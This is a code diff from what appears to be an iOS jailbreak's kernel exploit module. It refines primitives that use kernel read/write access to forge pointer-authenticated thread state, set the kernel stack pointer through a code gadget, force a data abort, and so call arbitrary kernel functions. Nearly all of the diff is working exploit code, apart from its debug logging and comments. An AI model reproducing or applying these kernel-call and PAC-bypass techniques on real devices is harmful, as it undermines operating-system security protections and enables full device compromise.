@@ -12,6 +12,8 @@
 #import "boot_info.h"
 #import "log.h"
 
+#pragma GCC diagnostic ignored "-Wempty-body"
+
 typedef struct {
 	bool inited;
 	thread_t gExploitThread;
@@ -75,6 +77,7 @@ uint64_t getUserReturnThreadContext(void) {
 	bzero(&state, sizeof(state));
 	
 	arm_thread_state64_set_pc_fptr(state, (void*)pac_loop);
+	
 	for (size_t i = 0; i < 29; i++) {
 		state.__x[i] = 0xDEADBEEF00ULL | i;
 	}
@@ -92,7 +95,7 @@ uint64_t getUserReturnThreadContext(void) {
 		JBLogError("[-] getUserReturnThreadContext: Failed to find return thread!");
 		return 0;
 	}
-	
+
 	thread_suspend(chThread);
 
 	JBLogDebug("returnThread tid=%d, %d", kread64(returnThreadPtr+0x550), GetThreadID(chThread));
@@ -115,10 +118,11 @@ uint64_t getUserReturnThreadContext(void) {
 		JBLogDebug("armstate.x[%d]=%llx",i,old_state.__x[i]);
 	}
 
-	JBLogDebug("userThread pc=%llx lr=%llx sp=%llx",
+	JBLogDebug("userThread pc=%llx lr=%llx sp=%llx cpsr=%x",
 	kread64(returnThreadACTContext + offsetof(kRegisterState, pc)),
 	kread64(returnThreadACTContext + offsetof(kRegisterState, lr)),
-	kread64(returnThreadACTContext + offsetof(kRegisterState, sp)) );
+	kread64(returnThreadACTContext + offsetof(kRegisterState, sp)),
+	kread32(returnThreadACTContext + offsetof(kRegisterState, cpsr)) );
 	for(int i=0; i<29; i++) {
 		uint64_t value = kread64(returnThreadACTContext + offsetof(kRegisterState, x[0]) + i*8);
 		JBLogDebug("userThread.x[%d]=%llx",i,value);
@@ -170,6 +174,8 @@ uint64_t Fugu14Kcall_withThreadState(Fugu14KcallThread *callThread, KcallThreadS
 	}
 	callThread->mappedState->sp = threadState->sp;
 
+	//((struct arm_kernel_saved_state*)((uint64_t)callThread->mappedState + 0x1000))->lr = 0x123456;
+
 	// Reset flag
 	gUserReturnDidHappen = 0;
 	
@@ -197,7 +203,7 @@ uint64_t Fugu14Kcall_withThreadState(Fugu14KcallThread *callThread, KcallThreadS
 	//[gKcallLock unlock];
 
 	ksync_finish();
-	
+
 	JBLogDebug("kcall kr=%d,%d,%d", kr1,kr2,kr3);
 	return retval;
 }
@@ -211,7 +217,7 @@ uint64_t Fugu14Kcall_withArguments(Fugu14KcallThread *callThread, uint64_t func,
 	KcallThreadState threadState = { 0 };
 		
 	for (size_t i = 0; i < 29; i++) {
-		threadState.x[i] = 0xDEADBEEF00ULL | i;
+		threadState.x[i] = 0xDEADBEEE00ULL | i;
 	}
 
 	Fugu14Kcall_prepareThreadState(&gFugu14KcallThread, &threadState);
@@ -227,13 +233,14 @@ uint64_t Fugu14Kcall_withArguments(Fugu14KcallThread *callThread, uint64_t func,
 		regArgc = argc;
 	}
 
-	// Set register args (x0 - x8)
+	// Set register args (x0 - x7)
 	for (uint64_t i = 0; i < regArgc; i++)
 	{
 		threadState.x[i] = argv[i];
 	}
 
 	// Set stack args
+	threadState.sp -= stackArgc * 8;
 	for (uint64_t i = 0; i < stackArgc; i++)
 	{
 		uint64_t argKaddr = (threadState.sp + i * 0x8);
@@ -322,19 +329,22 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
 		return false;
 	}
 
-	for (size_t i = 0; i < 29; i++) {
-		kwrite64(actContext + offsetof(kRegisterState, x[0]) + i*8, 0xEEADBEEF00ULL | i);
-	}
-	
-	JBLogDebug("actContext=%llx pc=%llx lr=%llx sp=%llx jophash=%llx", actContext,
+	JBLogDebug("actContext=%llx pc=%llx lr=%llx sp=%llx cpsr=%x jophash=%llx", actContext,
 	kread64(actContext + offsetof(kRegisterState, pc)),
 	kread64(actContext + offsetof(kRegisterState, lr)),
 	kread64(actContext + offsetof(kRegisterState, sp)),
+	kread32(actContext + offsetof(kRegisterState, cpsr)),
 	kread64(actContext + 0x128) );
 	for(int i=0; i<29; i++) {
 		uint64_t value = kread64(actContext + offsetof(kRegisterState, x[0]) + i*8);
 		JBLogDebug("actContext.x[%d]=%llx",i,value);
 	}
+
+	// for testing "Invalid Kernel Stack Pointer" panic
+	for (size_t i = 0; i < 29; i++) {
+		kwrite64(actContext + offsetof(kRegisterState, x[0]) + i*8, 0xDEADBEED00ULL | i);
+	}
+	
 	arm_thread_state64_t old_state;
 	mach_msg_type_number_t old_stateCnt = ARM_THREAD_STATE64_COUNT;
 	JBLogDebug("getstate=%d", thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt));
@@ -343,7 +353,7 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
 		JBLogDebug("armstate.x[%d]=%llx",i,old_state.__x[i]);
 	}
 
-	// stack is at middle of allocation
+	// stack is at middle of allocation // # define KERNEL_STACK_SIZE	(4*4*4096)=0x10000
 	uint64_t stack = kernelAllocation + 0x8000ULL;
 
 	// Write context
@@ -359,11 +369,11 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
 	kwrite64(actContext + offsetof(kRegisterState, x[16]), 0);
 	kwrite64(actContext + offsetof(kRegisterState, x[17]), brX22);
 
-	// Use str x8, [x9] gadget to set TH_KSTACKPTR
-	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x10ULL);
+	// Use str x8, [x9] gadget to set TH_KSTACKPTR (TH_KSTACKPTR must be in current stack range since CHECK_KERNEL_STACK in el1_sp0_synchronous_vector_long)
+	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x1000); //space for thread_kernel_state(TH_KSTACKPTR), needed size=0xD0
 	kwrite64(actContext + offsetof(kRegisterState, x[9]), threadPtr + bootInfo_getUInt64(@"TH_KSTACKPTR"));
 
-	// SP and x0 should both point to the new CPU state
+	// SP and x0 should both point to the new CPU state (mov x0,sp in exception_return, before exception_return_after_check)
 	kwrite64(actContext + offsetof(kRegisterState, sp),   stack);
 	kwrite64(actContext + offsetof(kRegisterState, x[0]), stack);
 
@@ -371,10 +381,11 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
 	// Include in signed state since it is rarely changed
 	kwrite64(actContext + offsetof(kRegisterState, x[2]), get_cspr_kern_intr_en());
 
-	JBLogDebug("actContext pc=%llx lr=%llx sp=%llx jophash=%llx", 
+	JBLogDebug("actContext pc=%llx lr=%llx sp=%llx cpsr=%x jophash=%llx", 
 	kread64(actContext + offsetof(kRegisterState, pc)),
 	kread64(actContext + offsetof(kRegisterState, lr)),
 	kread64(actContext + offsetof(kRegisterState, sp)),
+	kread32(actContext + offsetof(kRegisterState, cpsr)),
 	kread64(actContext + 0x128) );
 	for(int i=0; i<29; i++) {
 		uint64_t value = kread64(actContext + offsetof(kRegisterState, x[0]) + i*8);
@@ -415,10 +426,11 @@ void finalizePACPrimitives(void)
 	// Create a copy of signed state
 	kreadbuf(actContext, &gFugu14KcallThread.signedState, sizeof(kRegisterState));
 
-	JBLogDebug("signedState pc=%llx lr=%llx sp=%llx jophash=%llx", 
+	JBLogDebug("signedState pc=%llx lr=%llx sp=%llx cpsr=%x jophash=%llx", 
 	gFugu14KcallThread.signedState.pc, 
 	gFugu14KcallThread.signedState.lr, 
 	gFugu14KcallThread.signedState.sp,
+	gFugu14KcallThread.signedState.cpsr,
 	*(uint64_t*)((uint64_t)&gFugu14KcallThread.signedState + 0x128) );
 	for(int i=0; i<29; i++) {
 		uint64_t value = gFugu14KcallThread.signedState.x[i];
@@ -434,7 +446,7 @@ void finalizePACPrimitives(void)
 	// x1 -> new pc
 	// x3 -> new lr
 	kwrite64(actContext + offsetof(kRegisterState, x[1]), hw_lck_ticket_reserve_orig_allow_invalid);
-	// We don't need lr here
+	// We don't need lr here (eret to user thread directly)
 
 	// New state
 	// Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
@@ -456,7 +468,7 @@ void finalizePACPrimitives(void)
 	// (Probably not required)
 	MEMORY_BARRIER
 
-	JBLogDebug("mappedState pc=%llx lr=%llx sp=%llx", mappedState->pc, mappedState->lr, mappedState->sp);
+	JBLogDebug("mappedState pc=%llx lr=%llx sp=%llx cpsr=%x", mappedState->pc, mappedState->lr, mappedState->sp, mappedState->cpsr);
 	for(int i=0; i<29; i++) {
 		uint64_t value = mappedState->x[i];
 		JBLogDebug("mappedState.x[%d]=%llx",i,value);
